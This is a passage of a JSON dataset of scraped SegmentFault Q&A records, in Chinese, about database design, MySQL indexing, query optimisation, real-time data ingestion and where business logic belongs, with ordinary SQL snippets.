      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000202337\">\n<p>只有一点儿忠告：<strong>别用自己驾驭不了的技术</strong>。</p>\n<p>哪个熟悉，哪个你比较精通，就用哪个。</p>\n<p>如果两者都没用过，可以考虑 MongoDB。</p>\n</div>",
      "attention": "2",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000202279\">\n<p>我想做一个活动系统，每个活动都有很多tag, 当然有参加的人数，时间，地点。最近学习了mongodb 感觉如果用mongo会很方便：</p></div>",
      "favourite": "9",
      "glance": "5.4k",
      "tags": [
        "mongodb",
        "数据库设计",
        "数据库"
      ],
      "time": "2013-05-18",
      "title": "想做一个多tag的 系统用MongoDB好还是常规的MySQL好？",
      "url": "https://segmentfault.com/q/1010000000202279"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000171541\">\n<p>分布式不就解决了吗</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000171602\">\n<p>如果访问量很大了，或者说有很多资金去维持运营，就可以在建立很多机房，机房之间进行热备份，写操作集中在一个机房处理，读操作通过智能路由选择最近的机房读出了。据我所知淘宝就只这么做的，他们在国内至少有2到3个机房。机房之间近实时同步数据。<br/>\n如果没有那么多钱，可以选一个好的机房，好的机房支持多个线路，出口带宽也很大。一般速度也可以了。</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000172403\">\n<p>其实这个问题可以换一个角度看，其实不同国家之间的延迟没那么大的，对于用户而言，你的响应时间是20ms还是200ms没那么大差别。而干线网络只要能保证带宽，延时和吞吐还是稳定的，所以在大部分情况下，CDN relay一下也就可以解决问题了，相当于在终端把请求汇聚一下。如果这种链路都不能保证，就只能部署多份服务了，而其实对于搜索一类的服务，数据可以复制多份，随便扩展都是可以的。<br/>\n最大的问题是带数据库的服务，这里面没啥特别好的办法，一种做法是存多份，多份数据之间保持最终一致性，另一种做法就是使用比较好的cache机制</p>\n</div>",
      "attention": "1",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000171532\">\n<p>对于那些在全世界各地都有访问速度要求的网站, 他们是怎么做的, 比如Gmail.<br/>\n或许有些网站用户量还没有那么大, 但是已经开始在全世界都有用户. 对于网站速度的抱怨就此开始.</p><p>我们的经验是, 数据库通常需要和web/application服务器在一起(内网). 如果所有的数据都被放置在一个机房, 那么如何保证远距离的读取速度.</p><p>如果不是, 那么是利用一些缓存机制, 还是需要设计特殊的数据库结构, 或者批量的数据处理?</p><p>对于静态内容, 我们可以CDN, 缓存. 对于动态的内容, 有时候缓存会导致更多的麻烦.</p><p>在这里向大家请教了 :)</p>\n</div>",
      "favourite": "5",
      "glance": "2.7k",
      "tags": [
        "数据库",
        "网络",
        "cdn"
      ],
      "time": "2013-02-19",
      "title": "对于那些在全世界各地都有访问速度要求的网站, 他们是怎么做的",
      "url": "https://segmentfault.com/q/1010000000171532"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000155445\">\n<p>同意@地狱星星的看法。补充一点，对于这种情况，一是需要你检视一下自己的数据库表结构设计的是否合理；二是对于类似的需求，看是否能够将其转化为主键或有效索引项的查询。</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000156428\">\n<p>是的，如果你的STATUS字段值是个状态值的话，是走全表扫描的，索引的建立是在distinct column很大的基础上，不知道status字段类型是否是enum，这样的话更好了</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000131642\">\n<p>user_id需要建立索引<br/>\nstatus因重复值太多，即使建立索引，数据库系统仍然会采用全表扫描的方式读取数据</p>\n</div>",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000131319\">\n<p>Mysql的排序字段要建立索引，我想这连初学者都知道。但是我想知道的是在下面这两种情况下对索引建立是否有一定的标准。假如我建立一个这样的<code>post</code>表</p><pre>mysql&gt; DESC post;\n+---------+------------------+------+-----+---------+----------------+\n| Field   | Type             | Null | Key | Default | Extra          |\n+---------+------------------+------+-----+---------+----------------+\n| id      | int(11) unsigned | NO   | PRI | NULL    | auto_increment |\n| user_id | int(11)          | YES  |     | 0       |                |\n| status  | tinyint(4)       | YES  |     | 0       |                |\n| text    | text             | YES  |     | NULL    |                |\n+---------+------------------+------+-----+---------+----------------+\n4 rows in set (0.00 sec)</pre><p>如果我要按<code>user_id</code>来查询</p><pre>mysql&gt; SELECT * FROM post WHERE user_id = 123;\n+----+---------+--------+-----------------+\n| id | user_id | status | text            |\n+----+---------+--------+-----------------+\n|  1 |     123 |      1 | asdfasdfasdfsdf |\n|  3 |     123 |      1 | dddddd          |\n+----+---------+--------+-----------------+\n2 rows in set (0.00 sec)</pre><p>或者我要按<code>status</code>来查询</p><pre>mysql&gt; SELECT * FROM post WHERE status = 0;\n+----+---------+--------+------------------+\n| id | user_id | status | text             |\n+----+---------+--------+------------------+\n|  2 |     243 |      0 | 23423zxcv2323234 |\n|  4 |     567 |      0 | xcvq3453q4534    |\n+----+---------+--------+------------------+\n2 rows in set (0.00 sec)</pre><p>这两种查询在语句上看来没有任何区别，但是业务需求上是有很大区别的，<code>user_id</code>是一个外键字段，它的值是很分散的。而<code>status</code>是一个状态字段，它就集中在几个数字上，可能大部分还是某一个数字。对这两种查询如果做索引需要怎么考虑呢？我想的是虽然<code>status</code>是作为查询条件的，但是如果它的值大部分都是重复的，那么实际上索引起不到什么作用，反而还耽误载入索引的时间，不知道我的想法是否正确？</p>\n</div>",
      "favourite": "5",
      "glance": "5.1k",
      "tags": [
        "mysql",
        "数据库",
        "sql"
      ],
      "time": "2012-10-23",
      "title": "MySQL 的查询条件要用到的字段是否需要建立索引？",
      "url": "https://segmentfault.com/q/1010000000131319"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000133875\">\n<p>rails 有 migrate 工具，所有数据库更改都会记录在 migration中， 可以很方便的进行数据库结构的改变。<br/>\n不知道你是做什么开发的。但应该也有相类似的工具。当然，你可以用rails的migrate工具进行数据库的更改。</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000140912\">\n<p>最好用：SQLDelta</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000141055\">\n<p><a href=\"http://schemasync.org/\" rel=\"nofollow\" target=\"_blank\" title=\"http://schemasync.org/\">http://schemasync.org/</a><br/>\npython写成, 比较两个库结构的时候生成一个patch脚本和一个revert脚本, 非常方便实用, 最重要的是直观</p>\n</div>",
      "attention": "1",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000133863\">\n<p>因为现在业务需求变化较快，在开发环境的数据库中经常变化一些表结构，比如增加或删除一个字段，增加一些索引等等。有时候我会记录一下变动的字段，但是有时候东西一多就忘记了。</p><p>有没有一种工具，可以让我方便地比对线上和开发环境数据库表结构的异同，这样我就可以知道要更改哪些字段了。</p>\n</div>",
      "favourite": "1",
      "glance": "5.2k",
      "tags": [
        "数据库"
      ],
      "time": "2012-10-31",
      "title": "有没有可以比对两个数据库中数据表结构异同的工具",
      "url": "https://segmentfault.com/q/1010000000133863"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000179665\">\n<p>我们的 MySQL(Percona Server) 数据库有一个很大的表，1000多万条记录，我发现有很多类似的慢查询，40来秒：</p><pre>      SELECT col1, Seller, col3, col4, Id, col5  \n        FROM table1 \n       WHERE Seller = 346761 \n         AND col1 IN (2, 3, 4) \n         AND col3 = 1  \n         AND col4 NOT IN (5,6,7)  \n    ORDER BY Id DESC \n       LIMIT 0, 20;</pre><p>我发现在 <code>Seller</code>, and <code>col1</code>, <code>col3</code>, <code>col4</code> 这几个列已经建了独立索引。 Id 是主键。</p><p>EXPLAIN 显示 MySQL 查询这个语句的时候使用了 Primary key 索引, 而不是 Seller。</p><pre>+----+-------------+------------------+-------+--------------------+---------+---------+------+------+-------------+\n| id | select_type | table            | type  | possible_keys      | key     | key_len | ref  | rows | Extra       |\n+----+-------------+------------------+-------+--------------------+---------+---------+------+------+-------------+\n|  1 | SIMPLE      | trans_audit_list | index | Seller,AuditStatus | PRIMARY | 8       | NULL | 1483 | Using where | \n+----+-------------+------------------+-------+--------------------+---------+---------+------+------+-------------+</pre><p>我感觉这个查询如果用 Seller 上的索引会很快，果然，我强制 <code>force index (Seller)</code>, 就只用 0.7 秒。<br/>\n为什么 MySQL 不用 Seller 上的索引，感觉使用这个索引是很显然的。</p><p>是不是因为指定了 order by Id, Id 是主键，所以 MySQL 就用主键索引了？</p><p>另外：我发现如果不加上 Limit 语句，就会使用 Seller 索引，查询会非常快。</p>\n</div>",
      "favourite": "3",
      "glance": "2.4k",
      "tags": [
        "mysql",
        "sql",
        "数据库"
      ],
      "time": "2013-03-18",
      "title": "为什么 MySQL 不用我期望的索引？",
      "url": "https://segmentfault.com/q/1010000000179665"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000323975\">\n<p>队列+mongodb。</p>\n<p>数据先入队列，然后开多线程入库。</p>\n<p>----ps:</p>\n<p>1秒1G数据，1分钟1x60=60G数据，1小时3.6T，一天86.4T数据，一个月就2.5PB。</p>\n<p>您做的是什么东西= =</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000328673\">\n<p>处理实时数据，最重要的是保证数据的有效性和不间断性，能够保证数据准确无误。有些情况会处理较高的并发性，有着大量的IO，要做到监控实时数据上处理上的压力，能够进行优化。<br/>\n例如：对于电信行业，对数据处理和实时数据有着非常高的并发性，数据一定要做到准确无误，并且有着非常大量的数据高并发处理。<br/>\n第一种方案：采用MongoDB数据库，MongoDB能够有效的缓解数据并发上所带来的压力，能够支持动态的扩容，有效的保证数据的不间断性，MongoDB有着监控机制，可以对数据上的利用率和性能效率上进行优化。如果考虑到数据处理量非常的大，IO操作会造出瓶颈，可以结合Redis内存数据库，可以有效缓解数据库上的压力。<br/>\n第二种方案：便于数据分析和处理，可以考虑采用HDF5文件系统，HDF5支持并发IO操作，如果对数据频繁的上的读写操作，采用分布式系统能够有效缓解数据处理上的压力。传统的部分金融行业会采用HDF5分布式来处理大量的实时金融数据。<br/>\n第三种方案：流式处理系统，需要进行大量的计算和规则运算分析，可以考虑采用Storm,这是一个复杂的实时数据处理方案。~~~Twitter开源。<br/>\n第四种方案：数据一定不能有任何上的差错，不能出现任何出入。必须保证有效性和一致性。可以考虑采用KDB+，银行和金融数据上会采用KDB+，不过需要学习复杂的Q语言。<br/>\n其他还有很多复杂的实时数据处理方案。不过要结合数据的规则和对于数据处理分析的方案来解决瓶颈。</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000324480\">\n<p>如果按照每10ms接收10M数据的话，1秒钟就是1G数据，每小时的数据量高达3.6T,这个大的数据量个人觉得使用传统的关系型数据已经不合适了。</p>\n<p>如果对查询的灵活性要求不高，建议直接放到日志文件存储。缓存的意义估计不大，一般配置的PC server，在这样的大数据量下内存是不够用的。</p>\n<p>至于权限管理，应该和数据存放方式没有直接关系，毕竟不可能让用户直接查询数据库，权限处理在应用程序中处理就可以了。</p>\n</div>",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000323846\">\n<p>需求大致上是这样的：数据接收端每5-10个毫秒会从分布式计算网络收到1-10M左右的数据，希望在不影响接收线程接收速度，不丢帧的前提下，把这些数据记录下来。这些数据是以任务名+时间戳+数据的形式发送过来的。希望能根据任务名实时保存到数据库中。\n现在的问题是有哪些数据库比较适合干这件事。</p>\n<p>数据库新手，曾经尝试过SQLserver2008，每来一条数据就调用API写入数据库，结果常常崩溃。后来先在内存中缓存一些再写入数据库，但是申请内存多了也容易导致程序崩溃。对sqlserver未做什么优化。</p>\n<p>考虑NOSQL数据库是不是更适合干这种事情，例如mongoDB什么的。</p>\n<p>我们现在的临时解决方案有两个，一个是先在内存中缓存，然后新开线程向数据库写入，但是在回放使用数据时非常麻烦，要对数据排序，合并等等。另一个是数据先直接写到硬盘的dat文件中，在接收结束后再慢慢写入数据库，写入后删除硬盘上的文件。问题是这些数据有保密性和访问权限的要求，如果在写入数据库过程中程序崩溃或者程序被强行中止，那么硬盘上的数据就暴露了。所以还是希望能实时入库。</p>\n</div>",
      "favourite": "9",
      "glance": "4.6k",
      "tags": [
        "数据库",
        "数据库性能优化",
        "实时",
        "仿真"
      ],
      "time": "2013-10-23",
      "title": "哪些数据库比较适合实现数据实时入库的需求？",
      "url": "https://segmentfault.com/q/1010000000323846"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000604998\">\n<p>你说的是不是这个<br><a href=\"http://charlesleifer.com/blog/sqlite-small-fast-reliable-choose-any-three-/\" rel=\"nofollow\">http://charlesleifer.com/blog/sqlite-small-fast-reliable-choose-any-three-/</a></br></p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000605516\">\n<p>这个博客程序是SF官方的~~~ 。。。  还有就是高并发为嘛要用SQLITE？</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000605876\">\n<p>楼主口说的锁死一词应该说是阻塞，高并发会带来不间断的SQL请求，导致一部分SQL还未处理或者正在处理，另外一部分已经在后面排队等待了，这个时候，也就发生了阻塞，如果说短时间内出现高并发，持续个几秒或最多几分钟的情况，队列里面的SQL排队一个个处理完，sqlite负载自然也会降下来，但如果持续的时间比较长，负载下不去，内存连接CPU都会爆满，则会导致sqlite挂掉</p>\n</div>",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000604959\">\n<p>据说，高并发下，sqlite会锁死。请问这个是是永久性的还是暂时（流量下来自动恢复）的？</p>\n<p>如果是永久性的，除了还原数据库，还有什么解决方法吗？</p>\n<p>程序是TYpecho，一个php博客程序(很好用哦)</p>\n</div>",
      "favourite": "0",
      "glance": "4.3k",
      "tags": [
        "typecho",
        "sqlite",
        "sqlite3",
        "数据库",
        "高并发"
      ],
      "time": "2014-07-15",
      "title": "高并发下，sqlite锁死是永久性的还是暂时的？",
      "url": "https://segmentfault.com/q/1010000000604959"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000634843\">\n<p>各位好，昨天晚上自己找到了一个方法，基本能满足我的需求。欢迎各位继续讨论~~看看有没有更好的方法~~</p>\n<pre><code>/*存储过程：按起始、终止时间，以及时间间隔，抽取数据*/\nDELIMITER $$\nDROP PROCEDURE IF EXISTS proc_HTAH01A_sampleData $$\nCREATE DEFINER=`root`@`localhost` PROCEDURE proc_HTAH01A_sampleData(IN timeBegin DATETIME, IN timeEnd DATETIME, IN timeInterval INT)\n    BEGIN\n        SET @time := '1000-01-01 00:00:00';\n        SET @interval := timeInterval;\n        SELECT * FROM HTAH01A\n        WHERE HTAH01A060 &gt;= timeBegin AND HTAH01A060 &lt;= timeEnd\n        AND TIMESTAMPDIFF( SECOND, @time, HTAH01A060 ) &gt;= @interval\n        AND @time := htah01a060;\n    END$$\nDELIMITER ;\n</code></pre>\n<p>调用如下：</p>\n<pre><code>call proc_HTAH01A_sampleData('2014-08-10 23:20:00', '2014-08-11 05:00:00', 120);\n</code></pre>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000634631\">\n<p>查rank排名 取rank除4余数相同的即可</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000634689\">\n<p><a href=\"http://segmentfault.com/u/chobits\">@Chobits</a> 的答案啦，本来想在他下面评论的，想想还是写出来，题主能看到。</p>\n<pre><code>  select * from (select rank() over(order by HTAH01A060) as rank_sort,* from table)\n    as a where a.rank_sort%4 = 0\n</code></pre>\n<p>如果不能保证HTAH01A060都不同的话，建议用row_number()</p>\n</div>",
      "attention": "1",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000634496\">\n<html><body>\n<p>我的项目用的是MySQL，但也想同时请教下在Oracle、SqlServer中应该如何处理如下问题：</p>\n<p>有数据表如下所示：<br>\n希望从表中抽取数据，要求两条记录的时间间隔至少2分钟<br>\n对下面图片中的数据而言，假如我查询的时间范围是从2014-08-10 23:20:00开始的，<br>\n则希望抽取到如下结果集：</br></br></br></p>\n<pre><code>'83', '57', '10041', '74.27', '0', '2014-08-10 23:20:04'\n'113', '57', '10041', '59.25', '0', '2014-08-10 23:22:06'\n'145', '57', '10041', '96.21', '0', '2014-08-10 23:24:07'\n'177', '57', '10041', '34.16', '0', '2014-08-10 23:26:08'\n'209', '57', '10041', '39.11', '0', '2014-08-10 23:28:09'\n</code></pre>\n<p>真实的场景是：传感器每隔30秒左右会向数据库里写一条记录，我要取N天的数据绘图，如果一次性查询N天的记录再进行抽稀的话，由于结果集太大，循环次数过多，导致时耗严重。我希望能通过sql语句直接在数据库层面进行数据抽稀，程序里要处理的数据就会少很多。</p>\n<p>问题就是，应该如何写SQL语句？谢谢各位！</p>\n<p><img data-src=\"http://segmentfault.com/img/bVcPdS\"/></p>\n</body></html>\n</div>",
      "favourite": "5",
      "glance": "4.2k",
      "tags": [
        "mysql",
        "数据库",
        "数据查询",
        "oracle",
        "sqlserver"
      ],
      "time": "2014-08-12",
      "title": "数据库查询，怎样按一定时间间隔跳跃查询数据？",
      "url": "https://segmentfault.com/q/1010000000634496"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000667789\">\n<p>不一定。这个是根据需求而定的。</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000667689\">\n<p>不一定啊， 比如用户登录记录表。可能数据量比较大，只会给时间字段建个索引。<br>\n之所以需要主键和唯一索引是为了确保类似用户表里的<code>userid</code>不会重复。同时加了索引查询速度才快。主键和唯一索引的主要区别是：一个表只能有一个主键，而唯一索引可以根据字段情况建多个<br>\n是否需要主键还是根据实际情况来决定，但大部分表都需要个主键。日志类的表可能不太需要</br></br></p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000667718\">\n<p>说具体情况具体分析是一句废话，你要明白索引是用来提高<strong>查找</strong>效率的，代价是降低<strong>插入</strong>效率。<br>\n所以如果有一张表，数据量很大，而且有频繁的插入操作，但查找操作较少，这种表你就可以考虑不添加索引，这样可以保证插入的效率，但代价是查找操作可能会变得非常慢。</br></p>\n<p>主键除了具有索引的功能之外还具有保证唯一性的功能，你不能在一张表里添加有重复主键的多条记录，这是对数据完整性/一致性的一种保证，如果你需要这个功能，那么就需要主键，否则可以考虑不要。</p>\n</div>",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000667375\">\n<p>大家都说数据库在建表的时候，每个表都该有一个主键和唯一索引，老师也一直强调。希望有人能耐心解释一下为什么必须要这么做。</p>\n</div>",
      "favourite": "6",
      "glance": "11.3k",
      "tags": [
        "数据库设计",
        "数据库"
      ],
      "time": "2014-09-13",
      "title": "数据库每个表都应该有一个主键吗？",
      "url": "https://segmentfault.com/q/1010000000667375"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000707506\">\n<pre><code>SELECT DishCategory_Path,DishCategory_Name,DishCategory_Sort,\n　　　　　　concat(DishCategory_Path,'-',id)　as fullpath \nfrom chi_category \norder by concat(DishCategory_Path,'-',DishCategory_Sort)\n</code></pre>\n<p>这句话的效果</p>\n<p><img data-src=\"/img/bVc8dx\"/></p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000708475\">\n<p>其实我不知道这个问题最终是为了要解决什么问题，需求是什么没说清楚。<br>\n如果要在页面上按排序输出二级分类，那不是SQL做的事情。</br></p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000707230\">\n<p>我仔细看了一下问题.</p>\n<blockquote>\n<p>现在的第一个字段就是父级...<br>\n  只需要一股脑的把所有分类全取出来，再用动态语言去排序即可。</br></p>\n</blockquote>\n<hr>\n<p>旧答案：</p>\n<blockquote>\n<p>再加一个字段 <code>father</code>，红酒1和红酒2的<code>father</code>都是<code>0-12-16</code>，即可。</p>\n</blockquote>\n</hr></div>",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000707208\">\n<html><body>\n<p>老师请帮忙看看？<br>\n无限分类里里面的同级分类如何实现再排序</br></p>\n<pre><code>SELECT `DishCategory_Path`,`DishCategory_Name`,`DishCategory_Sort`,concat(`DishCategory_Path`,'-',id) as fullpath from chi_category order by fullpath asc,`DishCategory_Sort`asc\n</code></pre>\n<p><img data-src=\"/img/bVc78G\"><br>\nfullpath是排序了，但是因为order by要求当按照多个列进行排序时，只有第一列相同时才使用第二列。但是第一组fullpath是不可能相同的。请问现在怎么实现比如 如图中红酒下级分类 红酒1和红酒2这两个再实现排序。<br>\n求教了</br></br></img></p>\n</body></html>\n</div>",
      "favourite": "0",
      "glance": "1.7k",
      "tags": [
        "php",
        "mysql",
        "thinkphp",
        "数据库",
        "开发"
      ],
      "time": "2014-10-03",
      "title": "mysql order by语句，无限分类问题",
      "url": "https://segmentfault.com/q/1010000000707208"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "6",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000761480\">\n<p>假设新浪微博里的微博数据条数有数亿了,请问新浪现在想查询浏览量最高的前10条数据，如何做？</p>\n</div>",
      "favourite": "2",
      "glance": "2k",
      "tags": [
        "数据库",
        "数据库性能优化",
        "关系型数据库",
        "nosql",
        "架构师成长之路"
      ],
      "time": "2014-11-06",
      "title": "假设新浪微博里的微博数据条数有数亿了,请问新浪现在想查询浏览量最高的前10条数据，如何做？",
      "url": "https://segmentfault.com/q/1010000000761480"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000002405509\">\n<p>取值一定会用到order by 的，那么在order by 的字段（logintime）最后登录时间需要建一个索引，这样可以提高排序效率。</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000002423903\">\n<p>对logintime和userid都创建索引呢， 哪个效率会更高一些</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000002423344\">\n<p><a href=\"/u/sub\">@sub</a> 同学先排序再 <code>group by</code> 的方法是可以的，这里再写一种效率更高的方法。当然对 <code>logintime</code> 建立索引是非常可取的一点。</p>\n<pre><code>select userid,dat from tbl t where t.logintime = (select max(logintime) from tbl where userid = t.userid)\n</code></pre>\n<p>参考：<a href=\"http://xsk.tehon.org/den/index.php/category/tech/discuss-about-sql-of-returning-max-in-group.html\" rel=\"nofollow\">分组计算的SQL设计探讨</a></p>\n</div>",
      "attention": "6",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000002403198\">\n<p>现有实际需求如下：表TBL(userid,logintime,dat)，userid为用户名（KEY），logintime为登录时间，dat为某些数据，请写SQL语句返回每个有记录的用户在最后一次登录所产生的userid,dat结果集。</p>\n<p>这个问题其实是一个广谱性的问题，在很多场景下会遇到。那么对于这类单表分类（userid相同的视为一类）取最值（或者是最大两个或三个值）的问题，如何设计SQL才能使效率最高？</p>\n</div>",
      "favourite": "2",
      "glance": "1.6k",
      "tags": [
        "sql",
        "db",
        "数据库",
        "数据库性能优化"
      ],
      "time": "2014-12-03",
      "title": "单表分类取最值的SQL如何实现效率最高？",
      "url": "https://segmentfault.com/q/1010000002403198"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "6",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000002428203\">\n<p>rails默认用自增id作为pk，并且url上通过id找到相应的资源，不过我想像微博那样通过一串长数字去定位资源<br>\n如：</br></p>\n<pre><code>http://weibo.com/u/1857759250\n</code></pre>\n<p>这种形式的数字id。</p>\n<p>该数字串最好能够有跟自增id的一定的对应关系，比如说是自增id经过一定的算法生成。<br>\n该数字串必须是唯一的，最好是不连续的，最好在10位以内。</br></p>\n<p>谢谢</p>\n</div>",
      "favourite": "4",
      "glance": "2.2k",
      "tags": [
        "算法",
        "ruby-on-rails",
        "ruby",
        "数据结构",
        "数据库"
      ],
      "time": "2014-12-16",
      "title": "求比较方便的基于自增id映射出一串唯一数字id的算法",
      "url": "https://segmentfault.com/q/1010000002428203"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "5",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000002433696\">\n<p>最近在朋友的邀请下注册了知乎，确实是一个不错的开放平台。<br>\n这里想来讨论一下知乎的“话题”结构。</br></p>\n<p>简单分析一下：</p>\n<ul>\n<li>1个话题可以有多个之话题，也可以有多个父话题。<br>\n我的理解这个一个类似N叉树的结构。任意只话题可以有多个线路到达顶级节点，每个话题也存在多个子节点。</br></li>\n<li>限制：如果a是b的子节点，那么在b节点的上面就不能够在添加a节点，反之也是。</li>\n</ul>\n<p>那么，这样的技术实现。数据库表应该如何设计呢？表结构初定3个字段</p>\n</div>",
      "favourite": "1",
      "glance": "3.2k",
      "tags": [
        "知乎",
        "数据库",
        "数据库设计",
        "标签"
      ],
      "time": "2014-12-19",
      "title": "关于知乎的话题组织结构，数据表应该如何设计？",
      "url": "https://segmentfault.com/q/1010000002433696"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "4",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000002474492\">\n<html><body>\n<p><img data-src=\"/img/bVkxS0\"/></p>\n<p><img data-src=\"/img/bVkxTf\"/></p>\n</body></html>\n</div>",
      "favourite": "0",
      "glance": "1.4k",
      "tags": [
        "mysql",
        "数据库"
      ],
      "time": "2015-01-09",
      "title": "mysql为什么用了子查询后，主查询没走主键索引",
      "url": "https://segmentfault.com/q/1010000002474492"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000002619166\">\n<p>这不是业务逻辑，而是数据库最基本的功能。<br>\n一般说业务逻辑放在数据库是指用存储过程等方法把业务特定的逻辑放在数据库中。我个人不赞同这种方式。<br>\n另外省份是可以，也应该用第三种方式统计的。你需要的是一张城市代码和省份对应关系的字典表。</br></br></p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000003100840\">\n<p>首先我们需要分清楚数据和状态。</p>\n<p><strong>状态是对数据的抽象</strong>。<br>数据多半不能直接被用户看到（比如你不能直接返回一个timestamp给用户），而状态则更贴近业务；<br>数据需要是原子的（数据库第一、二范式），而状态一般涉及一条以上的数据；<br>数据稳定性高，状态变数多：需求变化了，不应该去操作全量数据，而是修改状态控制；<br>数据适合放在有持久化的地方，而状态根据数据动态算出，适合放在内存中（当然，系统大到出现集群的概念以后，状态也可能需要持久化）。</br></br></br></br></p>\n<h2>读</h2>\n<p>大部分时候，我们需要的都不是裸数据，而是根据数据获得的状态。由数据转化为状态的逻辑总得放在一个端，要么是数据库，要么是后端，在非常少见的情形里，是前端/客户端。</p>\n<p>读操作的逻辑放在哪里不那么非黑即白，需要根据具体业务分析。</p>\n<h2>写</h2>\n<p>对数据本身的约束可以放在数据库中：</p>\n<ul>\n<li><p>unique</p></li>\n<li><p>unsigned</p></li>\n<li><p>primary</p></li>\n</ul>\n<p>对状态的约束一般在控制在数据的写操作<strong>前</strong>：</p>\n<ul><li><p>“每天只允许注册 100 个用户”这个需求就创建了“是否今天注册了超过100个用户”的状态</p></li></ul>\n<p>如果对状态的约束全需要放在业务逻辑里，业务逻辑写在哪里呢？<br>不得不说，业务逻辑使用存储过程/触发器实现有很多很多缺点：</br></p>\n<ul>\n<li><p>存储过程/触发器异常处理很麻烦，程序流程处理复杂了不说，也难以对异常情形生成友好的错误提示</p></li>\n<li><p>存储过程/触发器难以断点调试</p></li>\n<li><p>存储过程/触发器基于关系型数据库，做更加复杂（树状结构等）/ 更加简单（连循环计算都需要一个临时表）的逻辑都有很大损耗</p></li>\n<li><p>存储过程/触发器杂糅了逻辑在数据库中，业务变大以后难以合理分层</p></li>\n<li><p>存储过程/触发器使用描述性语言，相对难以优化</p></li>\n</ul>\n<p>因此，几乎没有人把对状态的写操作的相关业务逻辑写在存储过程/触发器里。</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000002619985\">\n<p>个人观点，简单的放在数据库，复杂的放在程序里。</p>\n<p>先说约束，即什么合法什么不合法，比如「账户余额必须是数字」和「账户余额不能小于零」这种简单约束就比较适合放在数据库，因为这是一个不太可能去修改的底线，数据库中所有的数据都必须满足这个条件。<br>\n再比如「每天只允许注册 100 个用户」这种约束就比较适合放在程序里，因为不满足这个约束也不会对数据造成破坏，且这个约束很可能在未来修改。</br></p>\n<p>然后是查询，应该尽量在数据库中通过更多的查询条件淘汰掉不符合要求的数据，合适地选择查询条件会让数据库更有效率地利用索引。数据库有很多措施来保证当数据达到一个很大的量的时候依然可以快速地查询，但是如果把数据查到应用里再进行筛选，数据的量可能超出设计时的预期。</p>\n<p>分组也应当尽量在数据库进行，这样会减少传输的数据的量，而且数据库只需扫描一次就可以得到所有分组的结果（按照你的做法一，数据库很可能要扫描多次，因为数据库不知道你的几个查询之间的联系）。</p>\n</div>",
      "attention": "5",
